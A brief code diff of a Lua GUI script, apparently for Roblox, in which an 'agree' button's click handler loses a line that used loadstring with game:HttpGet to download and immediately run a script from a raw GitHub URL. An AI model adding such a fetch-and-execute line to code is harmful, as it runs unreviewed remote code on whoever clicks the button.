@@ -166,7 +166,7 @@ local function CreateGUI(title)
     agreeButton.MouseButton1Click:Connect(function()
         AnimateExit()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xcmsnd/xcmsnd/refs/heads/main/6.lua"))()
+
 
     end)
 end
